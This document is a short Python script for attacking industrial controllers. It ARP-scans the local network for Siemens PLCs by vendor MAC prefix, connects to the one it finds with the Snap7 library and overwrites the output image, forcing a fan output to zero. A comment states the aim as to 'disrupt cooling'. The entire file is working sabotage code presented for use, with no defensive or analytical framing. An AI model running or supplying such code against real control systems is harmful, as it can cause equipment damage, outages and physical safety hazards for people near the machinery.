import snap7
import socket
import struct

def find_plc_ip():
    """ Attempt to find the PLC IP address using ARP scanning. """
    import scapy.all as scapy  # Install with `pip install scapy`
    
    print("[*] Scanning local network for Siemens PLC...")

    # Assuming the device is on the same subnet, get the default gateway
    gw_ip = scapy.conf.route.route("0.0.0.0")[2]  
    network_prefix = ".".join(gw_ip.split(".")[:3])  # Get network prefix
    
    # Scan the network for active devices
    arp_request = scapy.ARP(pdst=f"{network_prefix}.1/24")
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_scan = broadcast / arp_request
    answered_list = scapy.srp(arp_scan, timeout=2, verbose=False)[0]
    
    for response in answered_list:
        ip = response[1].psrc
        mac = response[1].hwsrc
        if mac.startswith("00:0E:A8") or mac.startswith("08:00:06"):
            print(f"[+] Siemens PLC found at IP: {ip}")
            return ip
            
    print("[!] No Siemens PLC detected.")
    return None

def force_output(plc_ip, data_block, start_address, value):
    """ Connect to the PLC and overwrite an output image using Snap7. """
    
    plc = snap7.client.Client()
    
    try:
        print(f"[*] Connecting to PLC at {plc_ip}...")
        plc.connect(plc_ip, 0, 1)  # Rack=0, Slot=1 for S7-1200
        
        # Read current output memory
        current_outputs = plc.read_area(snap7.types.Areas.PE, 0, 0, 10)
        
        # Modify desired byte in the output area
        modified_outputs = bytearray(current_outputs)
        modified_outputs[start_address] = value
        
        print(f"[*] Forcing output at DB{data_block}, Address {start_address} to {value}")
        
        # Write updated output back to the PLC memory I/O image
        plc.write_area(snap7.types.Areas.PE, 0, 0, modified_outputs)
        
        print("[+] Output successfully overridden!")
        
    except Exception as e:
        print(f"[ERROR] Failed to manipulate PLC I/O: {e}")
    finally:
        plc.disconnect()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        # Force Fan_A output to OFF (0) to disrupt cooling
        fan_a_address = 0  # %Q0.0 from the tag table corresponds to Byte 0, Bit 0
        force_output(plc_ip, data_block=0, start_address=fan_a_address, value=0x00)
    else:
        print("[!] Cannot proceed. PLC IP not found.")